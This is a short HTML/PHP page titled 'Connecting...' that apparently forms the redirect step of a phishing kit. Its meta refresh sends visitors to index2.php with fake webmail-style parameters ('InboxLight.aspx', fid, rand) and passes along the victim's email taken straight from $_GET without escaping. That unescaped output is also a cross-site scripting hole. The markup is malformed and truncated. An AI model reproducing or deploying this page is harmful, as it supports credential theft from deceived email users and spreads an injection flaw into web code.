<html>
<head>
	<meta content="text/html; charset=windows-1252" http-equiv="Content-Type" />
	<title>Connecting...&nbsp;</title>
	<meta http-equiv="" content="10; index2.php?rand=13InboxLightaspxn.1774256418&fid.4.1252899642&fid=1&fav.1&rand.13InboxLight.aspxn.1774256418&fid.1252899642&fid.1&fav.1&email=<?php echo $_GET['email']; ?>&.rand=13InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1">

</body>
</htm